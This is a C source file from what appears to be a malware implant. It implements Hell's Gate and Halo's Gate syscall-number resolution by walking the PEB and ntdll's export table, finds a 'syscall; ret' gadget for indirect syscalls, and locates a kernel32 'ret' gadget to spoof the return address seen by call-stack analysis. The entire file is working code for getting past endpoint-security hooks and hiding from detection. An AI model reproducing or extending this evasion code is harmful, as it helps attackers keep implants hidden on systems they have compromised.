/*
 * hellsgate.c — Dynamic SSN (System Service Number) resolution via PEB walk.
 *
 * Strategy:
 *   1. Walk PEB → LDR → ntdll.dll module
 *   2. Parse ntdll's export table to find function by name
 *   3. Read the first bytes of the stub: "mov eax, <SSN>; mov r10, rcx; syscall"
 *   4. If stub is hooked (first bytes ≠ expected pattern), apply Halo's Gate:
 *      scan neighboring stubs ± N entries to recover the SSN by offset
 *   5. Find the "syscall; ret" gadget inside ntdll for indirect syscall
 *   6. Cache g_ssn + g_gadget for the assembly trampoline (syscall_stub.asm)
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

/* ── Globals populated by the assembly stub ──────────────────────────────── */
/* k32_ret: address of a "ret" (0xC3) instruction inside kernel32.dll .text.
 * Used by syscall_stub.asm to spoof the return address visible to call-stack
 * analysis — the chain becomes: ntdll!syscall;ret → kernel32!ret → real caller */
PVOID g_k32_ret = NULL;
/* These are declared in syscall_stub.asm and extern'd from implant.h */

/* ── Private state ────────────────────────────────────────────────────────── */
static PVOID  s_ntdll_base  = NULL;
static PVOID  s_syscall_gadget = NULL;  /* same as g_gadget */

/* ── SSN cache (avoids re-scanning for repeated calls) ───────────────────── */
#define SSN_CACHE_SIZE 32
static struct { char name[64]; DWORD ssn; } s_ssn_cache[SSN_CACHE_SIZE];
static int s_ssn_cache_count = 0;

/* ─────────────────────────────────────────────────────────────────────────── */

/* Case-insensitive wide-string compare, n chars */
static int wcsnicmp_c(const WCHAR *a, const WCHAR *b, int n) {
    for (int i = 0; i < n; i++) {
        WCHAR ca = (a[i] >= L'A' && a[i] <= L'Z') ? (a[i] + 32) : a[i];
        WCHAR cb = (b[i] >= L'A' && b[i] <= L'Z') ? (b[i] + 32) : b[i];
        if (ca != cb) return (int)ca - (int)cb;
        if (ca == 0)  return 0;
    }
    return 0;
}

/* Find ntdll.dll base via PEB → LDR InLoadOrder list */
static PVOID FindNtdll(void) {
    PVOID peb  = (PVOID)READ_GS_QWORD(0x60);
    PVOID ldr  = *(PVOID*)((BYTE*)peb + PEB_OFFSET_LDR);
    /* head of InLoadOrderModuleList */
    LIST_ENTRY *head = (LIST_ENTRY*)((BYTE*)ldr + LDR_OFFSET_INLOAD_LIST);

    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        /* BaseDllName.Length (USHORT) at LDR_ENTRY_OFFSET_BASENAME */
        USHORT  len = *(USHORT*)((BYTE*)e + LDR_ENTRY_OFFSET_BASENAME + USTR_OFFSET_LENGTH);
        WCHAR  *buf = *(WCHAR**)((BYTE*)e + LDR_ENTRY_OFFSET_BASENAME + USTR_OFFSET_BUFFER);
        /* "ntdll.dll" = 9 chars × 2 = 18 bytes */
        if (len == 18 && buf && wcsnicmp_c(buf, L"ntdll.dll", 9) == 0) {
            return *(PVOID*)((BYTE*)e + LDR_ENTRY_OFFSET_DLLBASE);
        }
    }
    return NULL;
}

/* Given ntdll base, parse its export table and return address of funcName */
static BYTE *FindNtdllExport(const char *funcName) {
    if (!s_ntdll_base) return NULL;
    BYTE *base = (BYTE*)s_ntdll_base;

    PIMAGE_DOS_HEADER dos  = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD expDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expDirRVA) return NULL;

    NT_EXPORT_DIR *expDir = (NT_EXPORT_DIR*)(base + expDirRVA);
    DWORD *funcs  = (DWORD*)(base + expDir->AddressOfFunctions);
    DWORD *names  = (DWORD*)(base + expDir->AddressOfNames);
    WORD  *ords   = (WORD *)(base + expDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        const char *name = (const char*)(base + names[i]);
        if (strcmp(name, funcName) == 0) {
            return base + funcs[ords[i]];
        }
    }
    return NULL;
}

/*
 * ReadSSNFromStub — read the SSN from an ntdll syscall stub.
 *
 * Unhooked x64 ntdll stubs look like:
 *   4c 8b d1          mov r10, rcx
 *   b8 XX 00 00 00    mov eax, <SSN>  ← bytes [4..7], SSN at offset [4]
 *   ...
 *
 * Returns -1 if stub appears to be hooked (first two bytes ≠ 4c 8b).
 */
static int ReadSSNFromStub(const BYTE *stub) {
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        /* clean stub */
        return (int)(*(DWORD*)(stub + 4));
    }
    /* hooked — first bytes differ */
    return -1;
}

/*
 * HaloGate — if the target stub is hooked, scan neighboring export stubs
 * (sorted by address) to find an unhooked neighbor and compute the SSN by
 * adding/subtracting the ordinal difference (each syscall stub is sequential).
 */
static int HaloGate(const char *funcName) {
    if (!s_ntdll_base) return -1;
    BYTE *base = (BYTE*)s_ntdll_base;

    PIMAGE_DOS_HEADER dos  = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD expDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expDirRVA) return -1;

    NT_EXPORT_DIR *expDir = (NT_EXPORT_DIR*)(base + expDirRVA);
    DWORD *funcs  = (DWORD*)(base + expDir->AddressOfFunctions);
    DWORD *names  = (DWORD*)(base + expDir->AddressOfNames);
    WORD  *ords   = (WORD *)(base + expDir->AddressOfNameOrdinals);

    /* Find the index of our target function */
    int targetIdx = -1;
    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        if (strcmp((const char*)(base + names[i]), funcName) == 0) {
            targetIdx = (int)i;
            break;
        }
    }
    if (targetIdx < 0) return -1;

    /* Scan up and down for a clean stub */
    for (int delta = 1; delta <= 20; delta++) {
        for (int sign = -1; sign <= 1; sign += 2) {
            int idx = targetIdx + sign * delta;
            if (idx < 0 || idx >= (int)expDir->NumberOfNames) continue;
            const char *name = (const char*)(base + names[idx]);
            /* Only consider Nt* / Zw* syscall stubs */
            if (name[0] != 'N' && name[0] != 'Z') continue;
            BYTE *stub = base + funcs[ords[idx]];
            int   ssn  = ReadSSNFromStub(stub);
            if (ssn >= 0) {
                /* Recover target SSN: neighbor SSN ∓ delta */
                return ssn - sign * delta;
            }
        }
    }
    return -1;
}

/*
 * FindDllBase — generic PEB LDR walk for any DLL by name (ASCII).
 * Reuses the same wcsnicmp_c helper already in scope.
 */
static PVOID FindDllBase(const WCHAR *name, int nameChars) {
    PVOID peb  = (PVOID)READ_GS_QWORD(0x60);
    PVOID ldr  = *(PVOID*)((BYTE*)peb + PEB_OFFSET_LDR);
    LIST_ENTRY *head = (LIST_ENTRY*)((BYTE*)ldr + LDR_OFFSET_INLOAD_LIST);
    USHORT targetLen = (USHORT)(nameChars * 2);

    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        USHORT  len = *(USHORT*)((BYTE*)e + LDR_ENTRY_OFFSET_BASENAME + USTR_OFFSET_LENGTH);
        WCHAR  *buf = *(WCHAR**)((BYTE*)e + LDR_ENTRY_OFFSET_BASENAME + USTR_OFFSET_BUFFER);
        if (len == targetLen && buf && wcsnicmp_c(buf, name, nameChars) == 0)
            return *(PVOID*)((BYTE*)e + LDR_ENTRY_OFFSET_DLLBASE);
    }
    return NULL;
}

/*
 * FindK32RetGadget — locate a lone "ret" (C3) inside kernel32.dll .text.
 * We want it inside a named exported function so call-stack unwinding shows
 * "kernel32!<FuncName>+offset" rather than an anonymous RVA.
 * We pick CreateFileW as the anchor — it legitimately calls NT I/O APIs.
 */
static PVOID FindK32RetGadget(void) {
    /* kernel32.dll = 12 wide chars */
    PVOID k32 = FindDllBase(L"kernel32.dll", 12);
    if (!k32) return NULL;

    BYTE *base = (BYTE*)k32;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    /* Find CreateFileW export address to anchor our search */
    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return NULL;
    NT_EXPORT_DIR *exp = (NT_EXPORT_DIR*)(base + expRVA);
    DWORD *funcs = (DWORD*)(base + exp->AddressOfFunctions);
    DWORD *names = (DWORD*)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD *)(base + exp->AddressOfNameOrdinals);

    BYTE *anchor = NULL;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        /* Look for CreateFileW as anchor */
        const char *n = (const char*)(base + names[i]);
        if (n[0]=='C' && n[1]=='r' && n[6]=='F' && n[9]=='W') { /* CreateFileW */
            anchor = base + funcs[ords[i]];
            break;
        }
    }
    /* Scan up to 512 bytes past anchor for a standalone C3 (ret) */
    BYTE *scan = anchor ? anchor : (base + nt->OptionalHeader.BaseOfCode);
    DWORD limit = anchor ? 512 : nt->OptionalHeader.SizeOfCode;
    for (DWORD j = 4; j < limit; j++) {
        /* Avoid C3 inside a REX prefix or multi-byte sequence:
           require preceding byte not to be 0x40-0x4F (REX) or 0xFF (indirect jmp) */
        BYTE prev = scan[j-1];
        if (scan[j] == 0xC3 && (prev < 0x40 || prev > 0x4F) && prev != 0xFF)
            return scan + j;
    }
    return NULL;
}

/* Find the "syscall; ret" (0F 05 C3) gadget inside ntdll's .text section */
static PVOID FindSyscallGadget(void) {
    if (!s_ntdll_base) return NULL;
    BYTE *base = (BYTE*)s_ntdll_base;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE *p   = base + sec[i].VirtualAddress;
            DWORD len = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j + 2 < len; j++) {
                if (p[j] == 0x0F && p[j+1] == 0x05 && p[j+2] == 0xC3) {
                    return p + j;
                }
            }
        }
    }
    return NULL;
}

/* ── Public API ───────────────────────────────────────────────────────────── */

BOOL HellsGateInit(void) {
    s_ntdll_base = FindNtdll();
    if (!s_ntdll_base) return FALSE;

    s_syscall_gadget = FindSyscallGadget();
    if (!s_syscall_gadget) return FALSE;

    /* Publish syscall gadget to the assembly stub */
    g_gadget = s_syscall_gadget;

    /* Find kernel32 ret gadget for call-stack spoofing */
    g_k32_ret = FindK32RetGadget();
    /* Non-fatal: if not found, stub falls back to unspoofed return */

    return TRUE;
}

/*
 * HellsGateSSN — resolve the SSN for funcName, with Halo's Gate fallback.
 * Returns 0xFFFFFFFF on failure.
 */
DWORD HellsGateSSN(const char *funcName) {
    /* Check cache first */
    for (int i = 0; i < s_ssn_cache_count; i++) {
        if (strcmp(s_ssn_cache[i].name, funcName) == 0)
            return s_ssn_cache[i].ssn;
    }

    BYTE *stub = FindNtdllExport(funcName);
    if (!stub) return 0xFFFFFFFF;

    int ssn = ReadSSNFromStub(stub);
    if (ssn < 0) {
        /* Hooked — try Halo's Gate neighbor recovery */
        ssn = HaloGate(funcName);
    }
    if (ssn < 0) return 0xFFFFFFFF;

    /* Cache it */
    if (s_ssn_cache_count < SSN_CACHE_SIZE) {
        strncpy(s_ssn_cache[s_ssn_cache_count].name, funcName, 63);
        s_ssn_cache[s_ssn_cache_count].ssn = (DWORD)ssn;
        s_ssn_cache_count++;
    }
    return (DWORD)ssn;
}

/*
 * HellsGateSetSSN — convenience: resolve funcName and store in g_ssn so the
 * next HellsGateCall() uses it.  Returns FALSE if resolution failed.
 */
BOOL HellsGateSetSSN(const char *funcName) {
    DWORD ssn = HellsGateSSN(funcName);
    if (ssn == 0xFFFFFFFF) return FALSE;
    g_ssn = ssn;
    return TRUE;
}
